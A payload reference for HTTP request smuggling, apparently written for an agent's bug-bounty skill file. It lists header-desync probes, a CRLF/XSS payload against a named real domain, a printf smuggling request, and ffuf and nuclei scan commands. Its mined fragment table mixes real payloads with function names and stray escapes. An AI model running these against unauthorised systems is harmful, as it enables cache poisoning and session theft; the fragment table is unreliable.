# Request Smuggling — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- CL.TE -> `Content-Length: 13` + `Transfer-Encoding: chunked`

- TE.CL -> chunked body with a smaller Content-Length

- TE.TE -> `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`

- HTTP/2 -> `Transfer-Encoding: chunked` injected as a header



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 6× | `\r\r` |

| 4× | `\r\n` |

| 3× | `{size}` |

| 3× | `auth_digest_string_quoted()` |

| 3× | `parse_conversion()` |

| 2× | `GET https://<URL> HTTP/1.1` |

| 2× | `r\n` |

| 2× | `Connection: close\t` |

| 2× | `http.createServer()` |

| 2× | `Content-Length: 6\r\n\r\nHello A` |

| 2× | `http_req_set_reader()` |

| 2× | `http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0` |

| 2× | `is_custom_fetch_listing_match()` |

| 2× | `imap_state_listsearch_resp()` |

| 2× | `Curl_pp_readresp()` |

| 2× | `printf "POST / HTTP/1.1\r\n"\ / "Host: localhost:5000\r\n"\ / "X-Abc:\rxTransfer-Encoding: chunked\r\n"\ / "\r\n"\ / "1\r\n"\ / "A\r\n"\ / ` |

| 2× | `Response / { host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' } / A / ---` |

| 2× | `[\r]xTransfer-Encoding: chunked[\r\n]` |

| 2× | `legit@example.com` |

| 2× | `{50}` |



## Parameters observed



`ver` · `mode` · `name` · `step` · `verify_token` · `param` · `authenticity_token` · `attributes[delivery-min-days]` · `attributes[delivery-max-days]` · `attributes[locale]` · `access_token` · `_fd` · `_ga` · `id` · `aeRg` · `e3t5b` · `mt`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_request-smuggling.txt` | 94 |

| `~/.local/share/hackerone-reports/wordlists/params_request-smuggling.txt` | 17 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_request-smuggling.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_request-smuggling.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Use Burp HTTP Request Smuggler / smuggler.py against CDN+origin pairs; Nuclei coverage is limited.



```sh

nuclei -u https://target -tags smuggling,http-smuggling \

       -severity low,medium,high,critical -rl 40 -o nuclei_request-smuggling.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.
